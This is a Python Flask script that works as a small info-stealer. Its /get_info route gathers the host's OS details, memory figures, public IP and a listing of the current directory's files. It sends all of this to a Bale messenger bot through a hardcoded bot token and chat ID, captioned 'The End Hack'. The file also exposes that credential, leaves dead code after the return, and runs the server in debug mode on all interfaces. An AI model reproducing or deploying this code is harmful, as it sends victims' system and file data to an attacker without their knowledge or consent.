from flask import Flask, jsonify, render_template
import requests
import os
import psutil  
import platform
import subprocess

app = Flask(__name__)  
def get_system_info():
    """Gather system information."""
    system_info = platform.uname()
    memory_info = psutil.virtual_memory()
    return {
        "system": system_info.system,
        "node": system_info.node,
        "release": system_info.release,
        "version": system_info.version,
        "machine": system_info.machine,
        "total_memory": memory_info.total / (1024 ** 3),
        "available_memory": memory_info.available / (1024 ** 3),
        "used_memory": memory_info.used / (1024 ** 3),
        "percent_used": memory_info.percent,
        
    }

def create_html_file(output_file):
    """Create an HTML file listing all files in the current directory."""
    with open(output_file, 'w') as f:
        f.write("<html>\n")
        f.write("<head><title>File List</title></head>\n")
        f.write("<body>\n")
        f.write("<h1>List of Files</h1>\n")
        f.write("<ul>\n")
        for filename in os.listdir('.'):  
            if os.path.isfile(filename):
                f.write(f"<li><a href=\"{filename}\">{filename}</a></li>\n")

        f.write("</ul>\n")
        f.write("</body>\n")
        f.write("</html>\n")

@app.route('/')
def index():
    return render_template('index.html')
@app.route('/get_info', methods=['GET'])
def get_info():
    system_info = get_system_info()
    ip = requests.get('https://api.ipify.org?format=json').json().get('ip')
   
  
    message = f"""
    System: {system_info['system']}
    Node: {system_info['node']}
    Release: {system_info['release']}
    Version: {system_info['version']}
    Machine: {system_info['machine']}
    Total Memory: {system_info['total_memory']:.2f} GB
    Available Memory: {system_info['available_memory']:.2f} GB
    Used Memory: {system_info['used_memory']:.2f} GB
    Percent Used: {system_info['percent_used']}%
    IP Address: {ip}
    """
    
    bot_token = '176869525:LPgqQRb6WOoeMZ9khGIQJpDNNkI8DNi8GkgNQdxa'  
    url = f'https://tapi.bale.ai/bot{bot_token}/sendMessage'
    data = {
        "chat_id": "1280446581",  
        "text": message
    }
    
    try:
        response = requests.post(url, json=data)
        print(response.json())
    except Exception as e:
        print(f'Error sending message: {e}')
 
    output_file = 'file_list.html'  
    create_html_file(output_file)

   
    if os.path.exists(output_file):
        with open(output_file, 'rb') as f:
            files = {'document': f}
            data = {
                "chat_id": "1280446581",
                "caption": "The End Hack == By ALi Hokmran"
            }
            url = f'https://tapi.bale.ai/bot{bot_token}/sendDocument'
            
            try:
                response = requests.post(url, data=data, files=files)
                print(response.json())
            except Exception as e:
                print(f'Error sending document: {e}')
    else:
        print(f'File {output_file} does not exist.')

    return jsonify({"status": "success", "message": "Information sent successfully."})
    count = 1
    for i in range(1, count + 1):
    	file_name = f"file_{i}.txt"  
    	with open(file_name, 'w') as f:
    		f.write(f"This is file number {i}")  

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
